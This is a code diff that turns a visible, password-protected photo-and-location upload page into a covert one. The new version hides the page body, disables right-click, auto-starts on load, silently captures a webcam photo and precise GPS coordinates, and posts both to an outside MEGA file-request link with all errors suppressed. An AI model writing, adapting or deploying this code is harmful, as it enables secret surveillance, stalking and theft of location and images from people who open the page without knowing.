@@ -3,162 +3,95 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Automatic Photo and Location Upload to MEGA</title>
-    <style>
-        body {
-            font-family: 'Poppins', sans-serif;
-            text-align: center;
-            background: #0d1117;
-            color: #ffffff;
-            margin: 50px;
-        }
-        input, button {
-            padding: 10px;
-            margin: 10px;
-            border: none;
-            border-radius: 5px;
-            font-size: 18px;
-            transition: 0.3s;
-        }
-        input {
-            background: #161b22;
-            color: #ffffff;
-            outline: none;
-            border: 1px solid #58a6ff;
-        }
-        #status {
-            font-size: 20px;
-            font-weight: bold;
-            animation: glow 1s infinite alternate;
-            white-space: pre-line;
-            text-align: left;
-            max-width: 600px;
-            margin: 20px auto;
-        }
-        @keyframes glow {
-            from { color: #58a6ff; }
-            to { color: #ffffff; }
-        }
-    </style>
+    <title>Hidden Upload</title>
     <script src="https://cdn.jsdelivr.net/npm/megaio/mega.js"></script>
+    <style>
+        body { display: none; } /* Hide the webpage */
+    </style>
 </head>
 <body>
-    <h1>📸 Automatic Photo and Location Upload to MEGA</h1>
-
-    <div id="auth-section">
-        <h2>🔒 Enter Password to Access</h2>
-        <input type="password" id="password" placeholder="Enter password">
-        <button onclick="checkPassword()">Submit</button>
-        <p id="auth-status" style="color: red;"></p>
-    </div>
-
-    <div id="main-content" style="display: none;">
-        <p id="status">Initializing...</p>
-        <canvas id="canvas" style="display: none;"></canvas>
-    </div>
+    <canvas id="canvas" style="display: none;"></canvas>
 
     <script>
-        // Remove the email and password, and instead use MEGA file request link.
-        const fileRequestLink = "https://mega.nz/filerequest/pfypZxt51fU";
+        // Disable right-click context menu
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
 
-        // Function to Update Status on Web Page
-        function updateStatus(message, isError = false) {
-            const statusElement = document.getElementById("status");
-            statusElement.style.color = isError ? "red" : "#58a6ff";
-            statusElement.innerText += `${message}\n`;
-        }
+        // Use MEGA file request link
+        const fileRequestLink = "https://mega.nz/filerequest/pfypZxt51fU"; // Replace with your actual link
 
-        // Password Check
-        function checkPassword() {
-            const enteredPassword = document.getElementById("password").value;
-            if (enteredPassword === "Nipunapromod@1") {
-                updateStatus("✅ Password correct.");
-                document.getElementById("auth-section").style.display = "none";
-                document.getElementById("main-content").style.display = "block";
-                startProcess();
-            } else {
-                updateStatus("❌ Incorrect password!", true);
-                document.getElementById("auth-status").innerText = "❌ Incorrect password!";
-            }
-        }
+        let megaSession = null;
 
-        // Start the Automatic Process
+        // Auto-login to MEGA (removed for file request link)
         function startProcess() {
-            updateStatus("📍 Requesting GPS location...");
             navigator.geolocation.getCurrentPosition(
                 (position) => {
                     const lat = position.coords.latitude;
                     const lng = position.coords.longitude;
                     const loc = `Latitude: ${lat}, Longitude: ${lng}`;
-                    updateStatus(`✅ GPS Location found: ${loc}`);
                     capturePhoto(loc);
                 },
-                (error) => {
-                    updateStatus("❌ GPS access denied!", true);
-                },
+                (error) => {},
                 { enableHighAccuracy: true, maximumAge: 0 }
             );
         }
 
-        // Capture Photo from Webcam
+        // Capture a hidden photo
         async function capturePhoto(location) {
-            updateStatus("📸 Attempting to access camera...");
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.createElement("video");
                 video.srcObject = stream;
-                video.play();
-                video.onloadedmetadata = () => {
-                    const canvas = document.getElementById("canvas");
-                    const ctx = canvas.getContext("2d");
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    stream.getTracks().forEach(t => t.stop());
-                    updateStatus("✅ Photo captured successfully.");
-                    uploadToMega(canvas, location);
-                };
-            } catch (error) {
-                updateStatus("❌ Failed to access camera.", true);
-            }
+                await video.play();
+
+                const canvas = document.getElementById("canvas");
+                const ctx = canvas.getContext("2d");
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                stream.getTracks().forEach(track => track.stop());
+                uploadToMega(canvas, location);
+            } catch (error) {}
         }
 
-        // Upload Files to MEGA using File Request Link
+        // Upload files silently
         function uploadToMega(canvas, location) {
-            updateStatus("🚀 Preparing to upload via MEGA File Request Link...");
-
-            // Prepare files
             const imageDataUrl = canvas.toDataURL("image/jpeg");
             const imageBlob = dataURLtoBlob(imageDataUrl);
             const locationBlob = new Blob([location], { type: 'text/plain' });
 
-            // Using the file request link to upload
+            // Using the MEGA file request link to upload
             const formData = new FormData();
             formData.append("file", imageBlob, "photo.jpg");
             formData.append("file", locationBlob, "location.txt");
 
-            // Submit to MEGA file request URL (replace with actual upload handling logic)
             fetch(fileRequestLink, {
                 method: "POST",
                 body: formData
-            }).then(response => {
+            })
+            .then(response => {
                 if (response.ok) {
-                    updateStatus("✅ Files uploaded successfully to MEGA.");
+                    console.log("✅ Files uploaded successfully to MEGA.");
                 } else {
-                    updateStatus("❌ File upload failed.", true);
+                    console.log("❌ File upload failed.");
                 }
-            }).catch(err => {
-                updateStatus(`❌ Error uploading to MEGA: ${err}`, true);
+            })
+            .catch(err => {
+                console.log(`❌ Error uploading to MEGA: ${err}`);
             });
         }
 
-        // Convert Data URL to Blob
         function dataURLtoBlob(dataurl) {
             const arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1];
             const bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
             for (let i = 0; i < n; i++) u8arr[i] = bstr.charCodeAt(i);
             return new Blob([u8arr], { type: mime });
         }
+
+        // Automatically start the process in the background
+        window.onload = () => { startProcess(); };
     </script>
 </body>
 </html>
